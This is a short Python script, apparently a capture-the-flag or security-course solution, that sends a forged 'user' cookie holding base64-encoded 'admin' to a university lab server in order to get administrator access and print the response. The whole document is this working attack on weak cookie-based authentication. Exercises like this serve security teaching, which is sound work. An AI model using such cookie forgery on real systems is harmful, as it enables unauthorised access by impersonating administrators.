import requests
import base64

link = "http://mustard.stt.rnl.tecnico.ulisboa.pt:23056"

adminEncoded = base64.b64encode(b"admin").decode("utf-8")
r = requests.get(link, cookies={'user': adminEncoded})
print(r.text)

